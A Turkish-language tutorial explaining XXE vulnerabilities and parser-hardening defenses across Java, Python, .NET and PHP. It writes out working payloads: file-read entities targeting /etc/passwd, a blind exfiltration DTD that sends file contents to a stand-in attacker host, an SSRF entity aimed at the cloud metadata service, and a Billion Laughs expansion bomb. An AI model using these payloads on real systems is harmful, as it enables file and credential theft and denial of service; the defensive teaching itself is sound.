# XML External Entity (XXE) Zafiyetleri

## Tanım

XML External Entity (XXE), bir uygulamanın XML girdisini işlerken kullandığı XML ayrıştırıcısının (parser) yanlış yapılandırılması sonucu ortaya çıkan bir güvenlik zafiyetidir. Saldırgan, XML belgesinin içine yerleştirdiği **dış varlık (external entity)** tanımları aracılığıyla sunucudaki dosyaları okuyabilir, sunucuyu iç ağdaki başka sistemlere istek yapmaya zorlayabilir (SSRF), servis dışı bırakma (DoS) saldırıları gerçekleştirebilir ve bazı durumlarda uzaktan kod çalıştırmaya kadar uzanan etkiler elde edebilir.

XXE, OWASP Top 10 listelerinde uzun süre bağımsız bir kategori olarak yer almış, sonraki sürümlerde "Security Misconfiguration" ve "Broken Access Control" gibi daha geniş başlıklar altında değerlendirilmiştir. Ancak zafiyetin özü değişmemiştir: sorun XML formatının kendisinde değil, **XML standardının çok güçlü ama tehlikeli bir özelliğinin varsayılan olarak açık gelmesindedir.**

Bu makalede XXE'nin kök nedenini, dış varlık mekanizmasının nasıl çalıştığını, dosya okuma ve SSRF gibi somut istismar senaryolarını, Billion Laughs türü DoS saldırılarını ve en önemlisi parser sıkılaştırma (parser hardening) ile savunma tekniklerini derinlemesine inceleyeceğiz.

## Kök Neden: XML Varlık (Entity) Mekanizması Neden Var?

XXE'yi anlamak için önce XML'in **DTD (Document Type Definition)** ve **entity** kavramlarını anlamak gerekir. Çünkü zafiyet bir "hata" değil, aslında standardın tasarım gereği sunduğu bir özelliğin kötüye kullanılmasıdır.

### Varlık (Entity) nedir?

XML'de bir **entity**, belge içinde tekrar tekrar kullanılabilecek bir metin parçasına verilen isimdir; bir tür değişken veya makro gibi düşünülebilir. XML'in yerleşik varlıkları vardır (örneğin `&lt;` küçüktür işaretini, `&amp;` ise `&` işaretini temsil eder). Ayrıca geliştiriciler DTD içinde kendi özel varlıklarını tanımlayabilir:

```xml
<!DOCTYPE ornek [
  <!ENTITY sirket "Acme Teknoloji A.S.">
]>
<mesaj>Hos geldiniz, &sirket; ailesine!</mesaj>
```

Burada `&sirket;` ayrıştırma sırasında "Acme Teknoloji A.S." metniyle değiştirilir. Buraya kadar tehlike yok; bu bir **internal (dahili) entity**.

### Dış varlık (external entity): Sorunun kalbi

XML standardı, varlıkların sadece belge içindeki metinden değil, **dışarıdaki bir kaynaktan** da içerik çekmesine izin verir. İşte tehlike buradadır:

```xml
<!DOCTYPE ornek [
  <!ENTITY dis SYSTEM "file:///etc/passwd">
]>
<mesaj>&dis;</mesaj>
```

`SYSTEM` anahtar kelimesi ayrıştırıcıya şunu söyler: "Bu varlığın içeriğini şu URI'den al." Ayrıştırıcı `file:///etc/passwd` yolunu açar, dosyanın içeriğini okur ve `&dis;` yerine yerleştirir. Eğer uygulama ayrıştırma sonucunu bir şekilde geri döndürüyorsa (örneğin bir hata mesajında, bir yanıtta, bir alanda), saldırgan sunucudaki hassas dosyanın içeriğini görebilir.

**Kök neden şudur:** Tarihsel olarak XML ayrıştırıcılarının büyük çoğunluğu, DTD işlemeyi ve dış varlık çözümlemesini **varsayılan olarak açık** getirmiştir. XML 1998'de veri değişimi için tasarlandığında güvenli olmayan içerik kaynakları düşünülmüyordu; standart "belgeyi tam olarak işle" mantığıyla kuruldu. Modern web'de ise XML girdisi çoğunlukla güvenilmeyen kaynaklardan (kullanıcılar, API çağrıları, SOAP istekleri, dosya yüklemeleri) geldiği için bu varsayılan davranış doğrudan bir saldırı yüzeyine dönüşür.

### Neden geliştiriciler bunun farkına varmaz?

Çünkü kod tamamen normal görünür. Bir geliştirici `DocumentBuilderFactory`, `libxml`, `lxml`, `SAXParser` gibi standart bir kütüphaneyle XML ayrıştırdığında, dış varlık çözümlemesinin arka planda çalıştığını çoğu zaman bilmez. Uygulama işlevsel olarak sorunsuz çalışır; zafiyet ancak biri özel hazırlanmış (malicious) bir XML gönderdiğinde tetiklenir. Bu "sessiz varsayılan" durumu XXE'yi bu kadar yaygın ve sinsi yapar.

## Genel (General) ve Parametre (Parameter) Varlıkları

İstismar senaryolarını anlamak için iki varlık türünü ayırt etmek gerekir:

- **Genel varlıklar** `&isim;` sözdizimiyle belge gövdesinde kullanılır (yukarıdaki örnekler).
- **Parametre varlıkları** `%isim;` sözdizimiyle sadece **DTD'nin içinde** kullanılır. Bunlar özellikle "blind" (kör) XXE ve out-of-band veri sızdırma tekniklerinde kritik rol oynar, çünkü bazı ayrıştırıcı yapılandırmaları genel dış varlıkları engellese bile parametre varlıklarını işlemeye devam edebilir.

```xml
<!DOCTYPE ornek [
  <!ENTITY % param SYSTEM "file:///etc/hostname">
  %param;
]>
```

Bu ayrım, savunma yaparken neden "sadece bir bayrağı kapatmanın" bazen yetmediğini açıklar: hem genel hem parametre varlık işlemesi ile hem de dış DTD yüklemesinin ayrı ayrı kapatılması gerekir.

## Somut İstismar Senaryoları

### 1. Klasik dosya okuma (in-band)

En temel senaryoda ayrıştırma sonucu doğrudan yanıta yansır. Saldırgan bir XML tabanlı endpoint'e (örneğin bir SOAP servisi, XML kabul eden bir REST API, ya da bir dosya import özelliği) şu payload'u gönderir:

```xml
<?xml version="1.0"?>
<!DOCTYPE veri [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<kullanici><isim>&xxe;</isim></kullanici>
```

Sunucu `<isim>` alanını yanıtta gösteriyorsa, `/etc/passwd` içeriği saldırgana döner. Windows sistemlerinde hedef `file:///c:/windows/win.ini` gibi bir yol olabilir.

**Neden çalışır?** Uygulama girdiyi güvenilmez saymadan tam ayrıştırma yapar ve alanı geri yansıtır. İki hata birleşir: dış varlık açık + kontrolsüz veri yansıması.

### 2. Kör (blind) XXE ve out-of-band sızdırma

Çoğu gerçek dünya senaryosunda ayrıştırma sonucu doğrudan yansımaz. Bu durumda saldırgan veriyi **kendi kontrolündeki bir sunucuya** (out-of-band, OOB) sızdırır. Genellikle bir dış DTD ve parametre varlıkları kullanılır:

Saldırganın sunucusundaki `kotu.dtd` dosyası:
```xml
<!ENTITY % dosya SYSTEM "file:///etc/hostname">
<!ENTITY % wrapper "<!ENTITY sizdir SYSTEM 'http://saldirgan.com/topla?veri=%dosya;'>">
%wrapper;
```

Hedefe gönderilen XML:
```xml
<!DOCTYPE veri [
  <!ENTITY % uzak SYSTEM "http://saldirgan.com/kotu.dtd">
  %uzak;
]>
<veri>&sizdir;</veri>
```

Burada mantık şudur: hedef ayrıştırıcı önce dış DTD'yi indirir, dosya içeriğini `%dosya;` ile okur, sonra bu içeriği bir HTTP isteğinin URL'sine gömerek saldırganın sunucusuna gönderir. Saldırgan kendi sunucusunun erişim loglarında dosya içeriğini görür. Bu teknik yanıt hiç geri dönmese bile veri çalmayı mümkün kılar; bu yüzden çok tehlikelidir.

Not: Bu tekniğin bazı sınırlamaları vardır. Örneğin çok satırlı dosyalar veya özel karakter içeren içerikler URL'ye gömülürken ayrıştırıcı hatası verebilir; bu durumda saldırganlar hata mesajlarını (error-based) sızdırma kanalı olarak kullanan varyasyonlara başvurur. Buradaki amaç kesin payload ezberlemek değil, **mekanizmayı** anlamaktır: dış DTD + parametre varlıkları = kontrolsüz veri kaçağı.

### 3. XXE üzerinden SSRF

XXE'nin en az anlaşılan ama en etkili yönlerinden biri **Server-Side Request Forgery (SSRF)** olarak kullanılabilmesidir. `SYSTEM` anahtar kelimesinin işaret ettiği URI mutlaka bir dosya olmak zorunda değildir; `http://` veya `https://` de olabilir:

```xml
<!DOCTYPE veri [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<veri>&xxe;</veri>
```

Burada ayrıştırıcı, sunucunun kendisi adına belirtilen adrese HTTP isteği yapar. Bulut ortamlarında `169.254.169.254` gibi **metadata servisi** adresleri özellikle değerlidir; buradan geçici erişim anahtarları (credentials), IAM token'ları veya yapılandırma bilgileri çalınabilir. Ayrıca saldırgan iç ağdaki (internal network) yönetim panellerine, veritabanlarına veya normalde dışarıdan erişilemeyen servislere erişmek için bu tekniği kullanabilir.

**Neden bu kadar güçlü?** Çünkü istek, güvenlik duvarının **içinden**, güvenilir sunucunun kimliğiyle çıkar. Dış dünyadan erişilemeyen iç kaynaklar, sunucunun bakış açısından erişilebilirdir. XXE bu iç erişimi saldırgana bir köprü olarak sunar.

### 4. Protokol destekleriyle genişleyen etki

Ayrıştırıcının hangi URI şemalarını (protocol handler) desteklediğine bağlı olarak etki büyür. Örneğin PHP'de `expect://` sarmalayıcısı etkinse komut çalıştırma, `php://filter` ile dosya içeriğini base64 kodlayarak sızdırma mümkün olabilir. Java ortamında `jar:` protokolü veya belirli koşullarda `netdoc:` gibi şemalar farklı davranışlara yol açabilir. Buradaki genel ilke: **ayrıştırıcının desteklediği her protokol, saldırganın kullanabileceği bir yetenektir.** Bu yüzden savunmada sadece dosya okumayı değil, tüm dış kaynak erişimini kısıtlamak gerekir.

## Billion Laughs: Denial of Service (DoS) Varyantı

XXE ile aynı entity mekanizmasını kötüye kullanan ama amacı veri çalmak değil sistemi çökertmek olan bir saldırı sınıfı vardır: **Billion Laughs** (bazen "XML bomb" veya "exponential entity expansion" olarak da anılır).

### Nasıl çalışır?

Fikir, iç içe geçmiş (nested) varlıklar tanımlayarak küçük bir girdinin bellekte devasa bir metne genişlemesini sağlamaktır:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  ...
]>
<lolz>&lol9;</lolz>
```

Her seviye bir öncekini on kez tekrar eder. Dokuz seviyede `&lol9;` yaklaşık bir milyar `lol` metnine genişler; bu da gigabaytlarca bellek demektir. Ayrıştırıcı bu genişlemeyi bellekte gerçekleştirmeye çalışırken RAM tükenir, süreç çöker veya sunucu yanıt veremez hale gelir. İsim de buradan gelir: bir milyar kere "lol".

### Neden basit bir boyut kontrolü yetmez?

Girdinin kendisi sadece birkaç yüz byte'tır; boyut sınırı koyarak engellemek işe yaramaz çünkü tehlike **genişleme oranındadır**, ham girdi boyutunda değil. Ayrıca **quadratic blowup** adı verilen bir varyant, tek bir büyük varlığı defalarca referans göstererek DTD derinliği kontrollerini de atlatabilir. Bu yüzden savunma, entity genişlemesini tamamen kapatmak veya genişleme limitlerini/derinliğini kısıtlamaktan geçer.

## Savunma: Parser Sıkılaştırma (Hardening)

Şimdi işin en önemli kısmına, savunmaya geliyoruz. XXE'ye karşı **tek ve kesin çözüm, XML ayrıştırıcısını güvenilmeyen girdi için doğru yapılandırmaktır.** Girdi filtrelemesi (payload'da `<!DOCTYPE` aramak gibi) kırılgan ve atlatılabilir olduğu için asla birincil savunma olmamalıdır.

### Temel ilke: DTD ve dış varlıkları kapat

En sağlam savunma, güvenilmeyen XML işlenirken **DOCTYPE/DTD işlemesini tamamen devre dışı bırakmaktır.** DTD hiç işlenmezse ne dış varlık, ne parametre varlık, ne de billion laughs saldırısı mümkündür; tek hamlede üç saldırı sınıfı birden kapanır. Çoğu modern ayrıştırıcıda "DTD yasakla" veya "doctype-decl'i reddet" anlamına gelen bir özellik bayrağı vardır. Eğer uygulamanın gerçekten DTD'ye ihtiyacı yoksa (ki nadiren vardır) bu en temiz seçenektir.

DTD tamamen kapatılamıyorsa, en azından şu üçünün birlikte kapatılması gerekir:
1. **Dış genel varlıklar** (external general entities)
2. **Dış parametre varlıkları** (external parameter entities)
3. **Dış DTD yükleme** (external DTD / external subset yükleme)

Bunlardan sadece birini kapatmak yetmez; örneğin genel varlıkları kapatıp parametre varlıklarını açık bırakmak, blind XXE'ye kapıyı açık tutar.

### Platforma göre yaklaşım (kavramsal)

Burada kesin metod adlarını ve bayrak isimlerini uydurmaktan kaçınıyorum, çünkü bunlar kütüphane ve sürüme göre değişir; yanlış bir bayrak adı yanlış bir güvenlik hissi yaratır. Bunun yerine **her platformda aranması gereken kavramları** veriyorum:

- **Java (JAXP: DocumentBuilderFactory, SAXParserFactory, XMLInputFactory / StAX, Transformer):** Fabrika (factory) nesnesi üzerinde DTD'yi tamamen yasaklayan özelliği etkinleştirin; ayrıca dış genel ve dış parametre varlıklarını `false` yapan öznitelikleri ayarlayın. OWASP'ın "XXE Prevention Cheat Sheet" belgesi her JAXP fabrikası için doğru güncel özellik dizgelerini listeler; üretim kodunda bu belgeyi referans almak en güvenli yoldur. Ek olarak XInclude işlemesinin kapalı olduğundan emin olun.

- **Python (lxml, xml.etree, xml.sax, minidom):** Standart kütüphane ayrıştırıcılarının bir kısmı dış varlık çözümlemesini varsayılan olarak yapmaz, bir kısmı yapar. Güvenli tarafta kalmak için `defusedxml` kütüphanesini kullanmak yaygın ve önerilen bir yaklaşımdır; bu kütüphane XXE ve entity expansion saldırılarına karşı sertleştirilmiş sarmalayıcılar (wrapper) sunar. `lxml` kullanılıyorsa ayrıştırıcı seçeneklerinde `resolve_entities`, `no_network` ve DTD yükleme davranışını kontrol eden parametreleri güvenli değerlere ayarlamak gerekir.

- **.NET (XmlReader, XmlDocument, XmlTextReader):** Güncel .NET sürümlerinde `XmlReaderSettings` üzerinden DTD işleme davranışını "yasakla" (prohibit) olarak ayarlamak ve harici kaynak çözümleyiciyi (`XmlResolver`) `null` yapmak temel savunmadır. Eski bileşenlerde `XmlResolver`'ın açık kalması yaygın bir hatadır.

- **PHP (libxml tabanlı: DOMDocument, SimpleXML, XMLReader):** Tehlikeli protokol sarmalayıcılarını (wrapper) devre dışı bırakmak ve dış varlık yüklemesini engelleyen libxml davranışını doğrulamak gerekir. Modern libxml sürümlerinde dış varlık yükleme varsayılan olarak kapalıdır, ancak eski kod tabanlarında geçmişte kullanılan ve dış varlık yüklemesini açan eski çağrılara dikkat edilmelidir.

Genel kural: **Kullandığınız dilin ve kütüphanenin resmi/OWASP dokümantasyonundaki güncel sıkılaştırma reçetesini uygulayın, ezberden bayrak yazmayın.** Sürümler arası davranış değiştiği için bir kez yapılandırıp bırakmak değil, kütüphane güncellendiğinde tekrar doğrulamak gerekir.

### Katmanlı ek savunmalar

Parser sıkılaştırma birincil ve zorunlu savunmadır; ancak derinlemesine savunma (defense in depth) için şunlar da eklenir:

- **Girdi doğrulama, ikincil katman olarak:** DTD içeren belgeleri reddetmek makul bir ek önlemdir, ama tek başına yeterli değildir çünkü kodlama (encoding) hileleriyle atlatılabilir.
- **Ağ segmentasyonu ve egress kontrolü:** Uygulama sunucusunun dışarıya keyfi HTTP isteği yapmasını engelleyen egress firewall kuralları, SSRF ve OOB sızdırmanın etkisini büyük ölçüde sınırlar. Metadata servislerine erişimi kısıtlamak (örneğin bulut sağlayıcının yeni sürüm metadata servisi ve token zorunluluğu) kritik bir katmandır.
- **Kaynak limitleri:** Ayrıştırıcı için entity genişleme sayısı, entity derinliği ve toplam bellek limitleri koymak, DTD tamamen kapatılamadığı durumlarda billion laughs riskini azaltır.
- **En az yetki (least privilege):** Uygulamanın çalıştığı hesabın okuyabileceği dosyaları kısıtlamak, başarılı bir dosya okuma saldırısının kapsamını daraltır.

## Yaygın Hatalar

Sahada tekrar tekrar görülen ve XXE savunmasını boşa çıkaran hatalar:

- **Sadece `<!DOCTYPE` dizgisini karaliste (blacklist) ile filtrelemek.** Saldırganlar farklı karakter kodlamaları (UTF-16, UTF-7 gibi), boşluk varyasyonları veya beklenmedik girdi noktalarıyla bu filtreyi atlatır. Karaliste XXE'de neredeyse her zaman kırılır.
- **Sadece dış genel varlıkları kapatıp parametre varlıklarını unutmak.** Bu, blind/OOB XXE'ye kapıyı açık bırakır.
- **Bir ayrıştırıcıyı düzeltip aynı uygulamadaki diğer XML giriş noktalarını unutmak.** Bir kod tabanında genellikle birden fazla yerde XML ayrıştırılır (SOAP servisi, dosya import, konfigürasyon okuma, üçüncü parti kütüphane içinde). Hepsinin ayrı ayrı sıkılaştırılması gerekir.
- **Beklenmedik formatların altında yatan XML'i gözden kaçırmak.** SVG resimleri, DOCX/XLSX gibi Office belgeleri (aslında ZIP içindeki XML), SAML kimlik doğrulama mesajları, RSS/Atom beslemeleri ve XML tabanlı API'ler hep birer XXE giriş noktasıdır. "Ben XML almıyorum" demek yanıltıcıdır; bir SVG yükleme özelliği de XXE'ye açık olabilir.
- **Üçüncü parti kütüphanelere körü körüne güvenmek.** Bir XML işleme kütüphanesinin güvenli olduğunu varsaymak yerine, o kütüphanenin güncel olup olmadığını ve güvenli varsayılanlarla mı yoksa güvensiz varsayılanlarla mı geldiğini doğrulamak gerekir.
- **SAML ve imza doğrulama bağlamında XXE.** Kimlik doğrulama akışlarında XML imzası doğrulanmadan önce ayrıştırma yapılırsa, imza kontrolü hiç devreye girmeden XXE tetiklenebilir. Bu, kimlik doğrulaması gerektirmeyen (pre-auth) bir saldırı yüzeyi oluşturduğu için özellikle tehlikelidir.
- **"Yanıt geri dönmüyor, o zalen güvendeyim" yanılgısı.** Blind XXE ve OOB teknikleri yanıt hiç görünmese bile veri çalabilir. Yansıma olmaması güvenlik garantisi değildir.

## En İyi Pratikler

Özetle, XXE'ye karşı sağlam bir duruş şu ilkeler üzerine kurulur:

1. **Mümkünse DTD'yi tamamen kapatın.** Güvenilmeyen XML işlerken doctype/DTD işlemesini reddetmek, tek hamlede dış varlık okuması, SSRF ve billion laughs saldırılarının hepsini birden ortadan kaldırır. Bu, en basit ve en güçlü savunmadır.
2. **DTD kapatılamıyorsa, dış genel varlık, dış parametre varlık ve dış DTD yüklemesinin üçünü birden kapatın.** Yarım önlem, açık kapı demektir.
3. **Ayrıştırıcı yapılandırmasını resmi/OWASP dokümantasyonundan alın, ezberden değil.** Bayrak adları ve varsayılanlar sürümle değişir; güncel reçeteyi uygulayın ve kütüphane güncellendiğinde tekrar doğrulayın.
4. **Mümkünse XML yerine daha basit ve varlık mekanizması olmayan formatları tercih edin.** İhtiyaç gerçekten XML'i gerektirmiyorsa JSON gibi formatlar bu saldırı sınıfını doğal olarak elemine eder. (Elbette JSON'un da kendi ayrıştırıcı riskleri vardır, ama entity genişlemesi ve dış varlık kavramı yoktur.)
5. **Tüm XML giriş noktalarını envanterleyin.** SVG, Office belgeleri, SAML, RSS, SOAP ve API'ler dahil her yerdeki XML işlemesini haritalayın ve hepsini sıkılaştırın.
6. **Derinlemesine savunma uygulayın.** Egress firewall ile SSRF/OOB etkisini sınırlayın, metadata servislerini koruyun, en az yetki ile dosya okuma kapsamını daraltın ve kaynak limitleri ile DoS riskini azaltın.
7. **Güvenlik testine XXE'yi dahil edin.** Otomatik tarayıcılar ve manuel penetrasyon testleri XXE giriş noktalarını sistematik olarak denemeli; özellikle blind/OOB senaryolarını out-of-band etkileşim sunucuları (OAST) ile test etmelidir.
8. **Bağımlılıkları güncel tutun.** XML ayrıştırma kütüphaneleri zaman zaman güvenli varsayılanlara geçen güncellemeler yayınlar; eski sürümlerde kalmak eski, güvensiz varsayılanlarla yaşamak demektir.

## Sonuç

XXE, "gelişmiş" görünen ama kökeni son derece basit bir zafiyet sınıfıdır: XML standardının güçlü bir özelliği olan dış varlık çözümlemesinin, güvenilmeyen girdi için varsayılan olarak açık gelmesi. Bu tek gerçek, dosya okumadan SSRF'e, bulut kimlik bilgisi hırsızlığından billion laughs DoS'una kadar geniş bir etki yelpazesine kapı açar.

İyi haber şu ki savunma da bir o kadar nettir: **güvenilmeyen XML'i işleyen her ayrıştırıcıda DTD ve dış varlık işlemesini kapatmak.** Karmaşık payload'ları ezberlemek yerine bu tek ilkeyi doğru, tutarlı ve tüm giriş noktalarında uygulamak, XXE'yi büyük ölçüde tarihe gömer. Anahtar kavramlar, saldırıda olduğu gibi savunmada da aynıdır: dış varlığın ne olduğunu, hangi kanalları açtığını ve ayrıştırıcının bunu nasıl kapatacağını anlamak.
